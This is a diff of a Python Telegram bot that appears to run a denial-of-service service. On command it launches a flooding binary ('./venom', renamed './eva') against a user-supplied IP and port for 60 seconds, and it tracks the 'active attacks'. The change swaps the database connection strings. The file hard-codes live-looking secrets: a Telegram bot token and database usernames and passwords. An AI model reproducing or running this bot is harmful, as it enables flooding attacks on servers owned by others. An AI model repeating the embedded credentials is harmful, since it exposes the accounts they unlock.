@@ -8,13 +8,13 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 TOKEN = '7535192958:AAHTgtUSj1gAMHNq2worj_U0d4zMikpknJo'
-MONGO_URI = 'mongodb+srv://VENOMxCRAZY:CRAZYxVENOM@cluster0.ythilmw.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
+MONGO_URI = 'postgresql://pepper:LAfhvdlTM6aQs-z1_kOCfw@mayhem-carp-16055.8nj.gcp-europe-west1.cockroachlabs.cloud:26257/defaultdb?sslmode=verify-full'
 CHANNEL_ID = -1002220516386
 ADMIN_IDS = [5886463657]
 
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['VENOM']
+db = client['pepper']
 users_collection = db.users
 bot = telebot.TeleBot(TOKEN)
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
@@ -23,7 +23,7 @@ active_attacks = {}
 def run_attack_command_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./venom", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./eva", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
